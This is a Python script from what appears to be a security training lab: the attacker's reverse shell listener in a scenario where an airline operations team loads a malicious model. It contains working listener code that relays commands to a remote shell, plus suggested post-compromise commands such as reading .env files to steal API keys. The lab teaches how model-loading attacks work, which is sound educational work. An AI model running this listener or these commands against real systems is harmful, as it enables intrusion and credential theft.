#!/usr/bin/env python3
"""
Lab 01: Attacker's Listener (Reverse Shell)

AIRLINE SCENARIO:
An external threat actor sets up a listener, waiting for the airline's
operations team to load the malicious "flight delay predictor" model.
Once connected, the attacker has access to the airline's ops network.

Run this FIRST in Terminal 1, then run victim script in Terminal 2.

Author: AmitK
License: MIT License
Disclaimer: For educational and demonstration purposes only.
"""

import socket
import sys
import os
import threading
from pathlib import Path
from dotenv import load_dotenv
from rich.console import Console
from rich.panel import Panel

# Load environment variables
load_dotenv(Path(__file__).parent / ".env")

console = Console()

LISTEN_HOST = "0.0.0.0"
DISPLAY_HOST = os.getenv("ATTACKER_HOST", "127.0.0.1")
PORT = int(os.getenv("ATTACKER_PORT", "4444"))


def main():
    console.print(Panel(f"""
[bold red]🏴‍☠️ ATTACKER'S REVERSE SHELL LISTENER[/bold red]

[yellow]Scenario:[/yellow] External threat actor waiting for airline ops team
to load the malicious flight delay prediction model...

[bold]Listening on:[/bold] 0.0.0.0:{PORT} (Victim connects to {DISPLAY_HOST}:{PORT})

[yellow]Demo Setup:[/yellow]

  [bold]Terminal 1 (You - Attacker):[/bold]
    python 1_attacker_listener.py

  [bold]Terminal 2 (Victim - Airline Ops Team):[/bold]
    python 2_victim_loads_model.py

When the ops team loads the model, you get shell access to their machine!
You can then access crew schedules, passenger data, flight plans, etc.
""", title="☠️ Attacker View - Airline Network Breach", border_style="red"))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((LISTEN_HOST, PORT))
        server.listen(1)
        console.print(f"[dim]Listening on {LISTEN_HOST}:{PORT}...[/dim]\n")

        conn, addr = server.accept()

        console.print("\n" + "🚨" * 20)
        console.print(f"[bold green]SHELL CONNECTED![/bold green] Airline Ops Server: {addr[0]}:{addr[1]}")
        console.print("🚨" * 20 + "\n")

        console.print(Panel("""
[bold]You now have shell access to the airline's operations server![/bold]

[cyan]Try these commands (simulated airline environment):[/cyan]
  whoami                          - See which service account you compromised
  dir                             - List files on the ops server
  type .env                       - Steal API keys and credentials
  echo COMPROMISED > proof.txt   - Leave proof of access

[yellow]In a real attack, you could access:[/yellow]
  - Passenger Name Records (PNR)
  - Crew scheduling systems
  - Flight plan databases
  - Revenue management data
  - Maintenance records

Type 'exit' to disconnect.
""", title="🎯 Airline Network Access Achieved!", border_style="green"))

        # Simple I/O forwarding for Windows
        def recv_thread():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode('utf-8', errors='replace'))
                    sys.stdout.flush()
                except:
                    break

        t = threading.Thread(target=recv_thread, daemon=True)
        t.start()

        while True:
            try:
                cmd = input()
                if cmd.lower() == 'exit':
                    break
                conn.send((cmd + "\n").encode())
            except (EOFError, KeyboardInterrupt):
                break

        conn.close()
        console.print("\n[yellow]Connection closed.[/yellow]")

    except KeyboardInterrupt:
        console.print("\n[yellow]Listener stopped.[/yellow]")
    except OSError as e:
        console.print(f"[red]Error: {e}[/red]")
        console.print("[yellow]Is another listener already running on this port?[/yellow]")
    finally:
        server.close()


if __name__ == "__main__":
    main()
